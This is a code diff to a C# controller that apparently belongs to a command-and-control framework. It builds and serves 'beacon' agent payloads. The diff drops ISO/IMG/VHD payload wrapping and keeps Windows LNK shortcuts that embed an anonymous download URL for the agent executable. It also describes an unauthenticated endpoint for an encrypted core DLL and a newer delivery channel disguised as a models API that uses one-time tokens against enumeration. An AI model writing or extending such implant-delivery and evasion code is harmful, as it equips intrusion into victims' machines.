@@ -384,42 +384,21 @@ public class BuilderController : ControllerBase
         if (!System.IO.File.Exists(filePath))
             return NotFound(new { error = "Build file not found on disk." });
 
-        // 按需打包格式：iso / img / vhd / lnk（构建产物不变，一次构建多格式投递）
-        switch (format?.ToLowerInvariant())
+        // 按需打包格式：仅 Windows 支持 lnk（构建产物不变）。
+        // Linux 载荷没有 EXE/LNK 概念：直接下载原始可执行文件。
+        var isWindows = BuilderBuildService.PlatformOs.TryGetValue(record.Platform, out var os) && os == "windows";
+        if (isWindows && string.Equals(format, "lnk", StringComparison.OrdinalIgnoreCase))
         {
-            case "iso":
-            {
-                var payload = System.IO.File.ReadAllBytes(filePath);
-                var bytes = Services.Packaging.BuilderPackageService.CreateIso("LIBRA", payload);
-                return File(bytes, "application/octet-stream", $"{Path.GetFileNameWithoutExtension(record.FileName)}.iso");
-            }
-            case "img":
-            {
-                var payload = System.IO.File.ReadAllBytes(filePath);
-                var bytes = Services.Packaging.BuilderPackageService.CreateImg(payload);
-                return File(bytes, "application/octet-stream", $"{Path.GetFileNameWithoutExtension(record.FileName)}.img");
-            }
-            case "vhd":
-            {
-                var payload = System.IO.File.ReadAllBytes(filePath);
-                var bytes = Services.Packaging.BuilderPackageService.CreateVhd(payload);
-                return File(bytes, "application/octet-stream", $"{Path.GetFileNameWithoutExtension(record.FileName)}.vhd");
-            }
-            case "lnk":
-            {
-                // 快捷方式内嵌匿名下载 URL（agent 可执行文件直出，无需鉴权）
-                var scheme = Request.Scheme;
-                var host = Request.Host.Value;
-                var url = $"{scheme}://{host}/api/beacon/artifact/{buildId}";
-                var bytes = Services.Packaging.BuilderPackageService.CreateLnk(url);
-                return File(bytes, "application/octet-stream", $"{Path.GetFileNameWithoutExtension(record.FileName)}.lnk");
-            }
-            default:
-            {
-                var stream = System.IO.File.OpenRead(filePath);
-                return File(stream, "application/octet-stream", record.FileName);
-            }
+            // 快捷方式内嵌匿名下载 URL（agent 可执行文件直出，无需鉴权）
+            var scheme = Request.Scheme;
+            var host = Request.Host.Value;
+            var url = $"{scheme}://{host}/api/beacon/artifact/{buildId}";
+            var bytes = Services.Packaging.BuilderPackageService.CreateLnk(url);
+            return File(bytes, "application/octet-stream", $"{Path.GetFileNameWithoutExtension(record.FileName)}.lnk");
         }
+
+        var stream = System.IO.File.OpenRead(filePath);
+        return File(stream, "application/octet-stream", record.FileName);
     }
 
     /// <summary>
@@ -559,7 +538,11 @@ public class BuilderController : ControllerBase
         }
     }
 
-    // ── Core DLL delivery (no auth — DLL is AES-encrypted) ─────────────
+    // ── Core DLL delivery ────────────────────────────────────────────────
+    // 旧端点（/api/beacon/core/{buildId}）保留兼容旧 agent，但核心防枚举逻辑
+    // 已统一到 /api/v1/models/{buildId}?t=<一次性凭证>（见 V1BootstrapController）。
+    // 本端点维持无鉴权（DLL 为 AES-256-GCM 密文，密钥协商需 beaconSecret），
+    // 不在此发放新凭证；新构建的 loader 一律走 v1 通道。
 
     [HttpGet("/api/beacon/core/{buildId}")]
     [AllowAnonymous]
